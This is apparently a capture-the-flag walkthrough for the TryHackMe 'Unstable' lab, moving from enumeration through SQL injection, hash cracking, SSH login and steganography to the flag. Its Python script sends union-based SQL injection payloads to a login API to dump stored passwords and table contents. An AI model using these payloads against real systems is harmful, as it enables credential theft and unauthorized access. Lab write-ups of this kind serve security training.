# 🛡 Unstable TryHackMe Lab Walkthrough

*SQL Injection → Hash Cracking → SSH → Steganography → Flag*

------------------------------------------------------------------------

## 📌 Lab Objective

This lab demonstrates:

-   Service Enumeration
-   Directory Bruteforcing
-   SQL Injection (Union-based)
-   Hash Cracking
-   SSH Access
-   Steganography Extraction
-   Base62 Decoding

------------------------------------------------------------------------

# 🔎 Step 1: Service Enumeration

``` bash
nmap -sV <target_IP>
```

------------------------------------------------------------------------

# 📂 Step 2: Directory Enumeration

``` bash
gobuster dir -u http://<target_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```

We identified a directory `/info` which exposed `/api/login`.\
However, it was restricted by HTTP method. After changing the request
from **GET to POST**,\
the endpoint required `username` and `password` parameters --- leading
to payload creation.

------------------------------------------------------------------------

# 💉 Step 3: SQL Injection Exploitation

``` python
import requests

url = "http://<target_IP>/api/login"

qq = [
    "1' UNION SELECT username,password FROM users order by id -- -",
    "1' UNION SELECT 1,group_concat(password) FROM users order by id -- -",
    "1' UNION select 1,tbl_name from sqlite_master -- -",
    "1' UNION SELECT NULL, sqlite_version(); -- -",
    "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='users'; -- -",
    "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='notes'; -- -",
    "' UNION SELECT 1,notes FROM notes -- -"
]

for q in qq:
    myobj = {
        'username': q,
        'password': '123456'
    }

    x = requests.post(url, data=myobj)
    print("Payload:", q)
    print("Response:", x.text)
    print("-" * 60)
```

------------------------------------------------------------------------

# 🔓 Step 4: Hash Cracking

``` bash
john hash.txt
```

------------------------------------------------------------------------

# 🖥 Step 5: SSH Login

``` bash
ssh username@<target_IP>
```

------------------------------------------------------------------------

# 🖼 Step 6: Download Image

``` bash
wget http://<target_IP>/get_image?name=mary_ann
```

------------------------------------------------------------------------

# 🔍 Step 7: Steganography Extraction

``` bash
steghide extract -sf mary_ann.jpeg
```

------------------------------------------------------------------------

# 🌈 Step 8: Final Decode

1.  Arrange extracted text in **RAINBOW order**\
2.  Decode using **Base62 https://www.dcode.fr/base62-encoding**\ 
3.  Retrieve the final flag

------------------------------------------------------------------------

# ⚠ Disclaimer

This lab is for educational purposes only.\
Do not attempt on systems without authorization.
